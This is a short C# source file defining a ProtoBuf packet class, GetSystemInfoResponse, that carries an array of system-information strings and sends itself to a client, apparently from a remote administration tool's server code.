using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class GetSystemInfoResponse : IPacket
    {
        public GetSystemInfoResponse()
        {
        }

        public GetSystemInfoResponse(string[] systeminfos)
        {
            SystemInfos = systeminfos;
        }

        [ProtoMember(1)]
        public string[] SystemInfos { get; set; }

        public void Execute(Client client)
        {
            client.Send<GetSystemInfoResponse>(this);
        }
    }
}